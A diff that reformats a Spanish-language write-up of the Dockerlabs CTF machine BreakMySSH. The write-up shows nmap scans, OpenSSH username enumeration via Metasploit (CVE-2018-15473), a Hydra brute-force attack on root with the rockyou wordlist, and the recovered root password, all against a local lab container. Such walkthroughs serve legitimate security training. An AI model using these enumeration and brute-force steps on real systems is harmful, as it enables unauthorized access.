@@ -1,22 +1,30 @@
-# 🖥️ Writeup - BreakMySSH 
+---
+icon: linux
+---
 
-**Plataforma:** Dockerlabs  
-**Sistema Operativo:** Linux  
+# BreakMySSH ​​
 
-> **Tags:** `Linux` `OpenSSH` `Metasploit` `Hydra` `Username Enumeration` `CVE-2018-15473` 
+## 🖥️ Writeup - BreakMySSH
 
-# INSTALACIÓN
+**Plataforma:** Dockerlabs\
+**Sistema Operativo:** Linux
+
+> **Tags:** `Linux` `OpenSSH` `Metasploit` `Hydra` `Username Enumeration` `CVE-2018-15473`
+
+## INSTALACIÓN
 
 Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.
 
-```bash 
+```bash
 unzip breakmyssh.zip
 ```
+
 La máquina ya está descomprimida y solo falta montarla.
 
 ```bash
 sudo bash auto_deploy.sh breakmyssh.tar
-``` 
+```
+
 Info:
 
 ```
@@ -41,23 +49,24 @@ Estamos desplegando la máquina vulnerable, espere un momento.
 Máquina desplegada, su dirección IP es --> 172.17.0.2
 
 Presiona Ctrl+C cuando termines con la máquina para eliminarla
-``` 
+```
 
 Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.
 
-# ESCANEO DE PUERTOS
+## ESCANEO DE PUERTOS
 
 A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.
 
 ```bash
 nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
-``` 
+```
 
 ```bash
 nmap -n -Pn -sCV -p22,80 --min-rate 5000 172.17.0.2
 ```
 
 Info:
+
 ```
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-11 17:28 CEST
 Nmap scan report for 172.17.0.2
@@ -80,6 +89,7 @@ searchsploit OpenSSH 7.7
 ```
 
 Info:
+
 ```
 ----------------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                               |  Path
@@ -102,6 +112,7 @@ run
 ```
 
 Info:
+
 ```
 [*] 172.17.0.2:22 - SSH - Using malformed packet technique
 [*] 172.17.0.2:22 - SSH - Checking for false positives
@@ -121,7 +132,7 @@ Info:
 
 Encontramos un usuario que no es por defecto: `lovely`.
 
-# FUERZA BRUTA
+## FUERZA BRUTA
 
 Intentamos un ataque de fuerza bruta sobre este usuario.
 
@@ -136,6 +147,7 @@ hydra -l root -P /usr/share/wordlists/rockyou.txt 172.17.0.2 ssh -t 60
 ```
 
 Info:
+
 ```
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -151,11 +163,12 @@ Casi de inmediato obtenemos las credenciales para `root` : `estrella`.
 
 Accedemos por `SSH` como `root`.
 
-```bash 
+```bash
 ssh root@172.17.0.2
 ```
 
 Info:
+
 ```
 root@54677c43b6f8:~# whoami
 root
